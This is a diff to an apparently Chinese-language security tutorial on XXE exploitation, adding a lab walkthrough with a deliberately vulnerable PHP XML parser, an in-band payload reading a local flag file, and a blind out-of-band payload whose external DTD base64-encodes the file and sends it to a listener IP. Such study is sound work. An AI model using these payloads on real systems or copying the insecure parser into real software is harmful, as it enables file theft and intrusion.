@@ -238,7 +238,98 @@ categories:
 
 # 0x05 ~ XXE 的利用
 
---------------------------------------------------------  先欠着 ovo  明天补上 真的 --------------------------------------------------------
+## a. 有回显读取本地文件
+
+test.php
+
+```php
+<?php
+    libxml_disable_entity_loader (false); //开启外部实体加载
+    $xmlfile = file_get_contents('php://input'); //读取http请求中的原始body
+    $dom = new DOMDocument(); //创建一个 DOM 文档对象
+    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
+	// 解析 xml，$xmlfile 要解析的 XML 内容， LIBXML_NOENT | LIBXML_DTDLOAD 解析选项，改变默认行为
+    $creds = simplexml_import_dom($dom);
+	// 把 DOM 对象转成 SimpleXML 对象
+    echo $creds; //输出这个 SimpleXML 对象的文本内容
+?>
+```
+
+我在d盘下创建了一个flag.txt文件，内容为 this is flag
+
+```xml
+<?xml version="1.0" encoding="utf-8"?> 
+<!DOCTYPE creds [  
+<!ENTITY goodies SYSTEM "file:///d:/flag.txt"> ]> 
+<creds>&goodies;</creds>
+```
+
+使用 `hackbar` 进行 post 传参
+
+![image-20261026203135461](./../images/image-20261026203135461.png)
+
+
+
+## b. 无回显读取本地文件
+
+如果无回显时，可以选择将读取的文件上传至个人服务器。此处的演示没用个人服务器，用本地主机仅作演示。
+
+test.php
+
+```php
+<?php
+    libxml_disable_entity_loader (false); //开启外部实体加载
+    $xmlfile = file_get_contents('php://input'); //读取http请求中的原始body
+    $dom = new DOMDocument(); //创建一个 DOM 文档对象
+    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
+	// 解析 xml，$xmlfile 要解析的 XML 内容， LIBXML_NOENT | LIBXML_DTDLOAD 解析选项，改变默认行为
+    $creds = simplexml_import_dom($dom);
+	// 把 DOM 对象转成 SimpleXML 对象
+    //echo $creds; //输出这个 SimpleXML 对象的文本内容
+?>
+```
+
+可以看到我们把输出注释掉后，再重复 a. 中的操作是看不到回显的
+
+![image-20261026203614835](./../images/image-20261026203614835.png)
+
+我们的 `IP` 为 `10.252.64.54`
+
+```dtd
+<!-- 把这个flag.txt给进行base64编码 -->
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///D:/flag.txt">
+<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://10.252.64.54:9999/?p=%file;'>">
+```
+
+然后我们去监听自己的 9999 端口
+
+![image-20261026210432112](./../images/image-20261026210432112.png)
+
+>  如果这里都在一台机器上的话，使用 php -S 0.0.0.0:8000 和 php -S 0.0.0.0:8888，去开启两个，要不然是一直监听不到的
+
+payload: 
+
+```xml-dtd
+<?xml version="1.0"?>
+<!DOCTYPE convert [
+<!ENTITY % remote SYSTEM "http://10.252.64.54:8888/evil.dtd">
+%remote;%int;%send;
+]>
+```
+
+![image-20261026210640617](./../images/image-20261026210640617.png)
+
+上面监听9999端口得到的就是flag.txt的内容就是需要一步base64解码
+
+
+
+## c. 内网主机探测
+
+```python
+
+```
+
+
 
 
 
